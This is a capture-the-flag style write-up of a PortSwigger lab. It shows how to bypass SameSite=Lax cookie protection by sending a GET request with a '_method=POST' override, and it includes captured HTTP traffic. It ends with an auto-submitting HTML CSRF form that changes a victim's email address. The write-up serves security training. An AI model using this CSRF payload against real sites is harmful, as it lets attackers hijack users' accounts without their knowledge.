---
layout: post
title: "SameSite Lax bypass via method override"
date: 2026-10-16
description: "PortSwigger CSRF lab bypassing SameSite=Lax with a GET request and a _method override."
series: PortSwigger CSRF
categories:
  - CTF
  - PortSwigger
tags:
  - CSRF
  - Web
---

## Description

This [lab](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override){:target="_blank"}'s change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.

You can log in to your own account using the following credentials: `wiener:peter`

## Steps

After logging in we can intercept the HTTP requests via Burp and notice that the `Session` cookie in the response is not set to `SameSite`; by default Chrome uses `SameSite=Lax`:

```http
POST /login HTTP/2
Host: 0a7d005b03f7b4c881e97f0500080038.web-security-academy.net
Cookie: session=bdE9KrrFH6EV5bOg69pPZ3zV8xDOYSqo
Content-Length: 30
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="154", "Google Chrome";v="154", "Not A(Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Dnt: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36
Origin: https://0a7d005b03f7b4c881e97f0500080038.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a7d005b03f7b4c881e97f0500080038.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Sec-Gpc: 1
Priority: u=0, i

username=wiener&password=peter
```

The response:

```http
HTTP/2 302 Found
Location: /my-account?id=wiener
Set-Cookie: session=jxOajNxnxNYW6KxnTgjuPzr3o7yhrCLg; Expires=Mon, 12 Oct 2026 18:57:25 UTC; Secure; HttpOnly
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

- `Secure` attribute: only over HTTPS.
- `HttpOnly`: not accessible from JavaScript.
- To bypass `SameSite=Lax` we can't use the HTTP `POST` method; it only works with HTTP `GET` requests.

If we try changing the change-email request to `GET`, we get a `Method Not Allowed` error:

```http
GET /my-account/change-email?email=jawad2%40example.com HTTP/2
Host: 0a7d005b03f7b4c881e97f0500080038.web-security-academy.net
Cookie: session=jxOajNxnxNYW6KxnTgjuPzr3o7yhrCLg
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="154", "Google Chrome";v="154", "Not A(Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Dnt: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36
Origin: https://0a7d005b03f7b4c881e97f0500080038.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a7d005b03f7b4c881e97f0500080038.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Sec-Gpc: 1
Priority: u=0, i
```

Response:

```http
HTTP/2 405 Method Not Allowed
Allow: POST
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 20

"Method Not Allowed"
```

If we try bypassing the method restrictions by passing the `_method` parameter, it works:

```http
GET /my-account/change-email?email=jawad3%40example.com&_method=POST HTTP/2
Host: 0a7d005b03f7b4c881e97f0500080038.web-security-academy.net
Cookie: session=jxOajNxnxNYW6KxnTgjuPzr3o7yhrCLg
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="154", "Google Chrome";v="154", "Not A(Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Dnt: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36
Origin: https://0a7d005b03f7b4c881e97f0500080038.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a7d005b03f7b4c881e97f0500080038.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Sec-Gpc: 1
Priority: u=0, i
```

The exploit form:

```html
<h1>Lab07</h1>

<form name="change-email-form" action="https://0a7d005b03f7b4c881e97f0500080038.web-security-academy.net/my-account/change-email" method="GET">
  <input type="hidden" name="email" value="jawad-lab07@example.com">
  <input type="hidden" name="_method" value="POST">
</form>

<script> document.forms[0].submit(); </script>
```
